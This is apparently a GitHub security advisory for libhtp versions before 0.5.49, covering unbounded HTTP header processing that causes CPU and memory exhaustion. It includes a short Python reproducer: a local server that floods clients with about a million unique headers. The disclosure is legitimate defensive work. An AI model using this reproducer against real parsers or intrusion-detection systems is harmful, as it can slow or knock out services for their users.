GHSA-rqqp-24ch-248f
Oct 16, 2024

## Package

libhtp

## Affected versions

< 0.5.49

## Patched versions

0.5.49

## Description

### Impact

Unbounded processing of HTTP request and response headers can lead to excessive CPU time and memory utilization, possibly leading to extreme slowdowns.

### Patches

This issue is addressed in 0.5.49.

### References

<https://redmine.openinfosecfoundation.org/issues/7191>

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

**Description**

Found while creating CTF challenge against curl CVE-2023-38039

Script to create traffic was
```
import socket

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 8001  # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        while True:
            data = conn.recv(1024)
            if not data:
                break
            conn.sendall(b"HTTP/1.1 200 OK\n")
            for i in range(1024*1024):
                conn.sendall(b"Name%d: value%d\n" % (i, i))

```

Most time is spent in `htp_process_response_header_generic`. doing the `htp_table_get`

Smaller reproducer

This was not found by quadfuzz, because there needs to be a massive copy/paste but with each getting a small unique mutation...

I guess the simple solution is to add a limit to the number of headers
